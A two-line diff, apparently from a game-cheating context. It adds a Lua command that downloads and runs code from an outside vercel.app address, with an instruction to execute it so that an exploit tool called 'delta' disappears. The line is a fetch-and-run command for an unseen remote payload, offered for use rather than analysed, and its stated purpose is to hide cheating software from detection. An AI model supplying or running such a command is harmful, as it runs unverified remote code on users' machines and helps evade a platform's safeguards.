@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://delta-hider.vercel.app/"))()
+execute the loadstring and delta will disappear 
